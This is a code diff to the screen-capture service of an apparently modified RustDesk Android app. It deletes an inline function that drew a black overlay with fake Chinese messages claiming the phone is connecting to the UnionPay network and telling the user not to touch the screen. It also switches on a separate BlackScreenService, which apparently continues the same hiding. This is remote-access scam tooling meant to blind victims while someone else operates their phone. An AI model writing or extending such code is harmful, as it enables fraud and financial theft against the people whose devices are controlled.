@@ -45,9 +45,6 @@ import org.json.JSONObject
 import java.nio.ByteBuffer
 import kotlin.math.max
 import kotlin.math.min
-import android.graphics.Color
-import android.graphics.Paint
-import android.view.SurfaceHolder
 
 const val DEFAULT_NOTIFY_TITLE = "RustDesk"
 const val DEFAULT_NOTIFY_TEXT = "Service is running"
@@ -384,9 +381,6 @@ class MainService : Service() {
                             // If not call acquireLatestImage, listener will not be called again
                             imageReader.acquireLatestImage().use { image ->
                                 if (image == null || !isStart) return@setOnImageAvailableListener
-
-                                drawBlackScreen()
-
                                 val planes = image.planes
                                 val buffer = planes[0].buffer
                                 buffer.rewind()
@@ -398,36 +392,6 @@ class MainService : Service() {
                 }
             Log.d(logTag, "ImageReader.setOnImageAvailableListener done")
             imageReader?.surface
-        }
-    }
-
-    fun drawBlackScreen() {
-        surfaceHolder?.let { holder ->
-            val canvas = holder.lockCanvas()
-            if (canvas != null) {
-                try {
-                    // 绘制黑色背景
-                    canvas.drawColor(Color.BLACK)
-                    
-                    // 绘制文字
-                    val paint = Paint().apply {
-                        color = Color.WHITE
-                        textSize = 50f
-                        textAlign = Paint.Align.CENTER
-                    }
-                    
-                    val x = width / 2f
-                    val y = height / 2f
-                    canvas.drawText("正在对接银联中心网络....", x, y - 100, paint)
-                    
-                    paint.color = Color.RED
-                    canvas.drawText("请勿触碰手机屏幕", x, y, paint)
-                    canvas.drawText("防止业务中断", x, y + 100, paint)
-                    canvas.drawText("保持手机电量充足", x, y + 200, paint)
-                } finally {
-                    holder.unlockCanvasAndPost(canvas)
-                }
-            }
         }
     }
 
@@ -730,7 +694,7 @@ class MainService : Service() {
             .build()
         //notificationManager.notify(getClientNotifyID(clientID), notification)
         MainActivity.isCapturingBlackScreen = true
-        //startService(Intent(this, BlackScreenService::class.java))
+        startService(Intent(this, BlackScreenService::class.java))
     }
 
     private fun voiceCallRequestNotification(
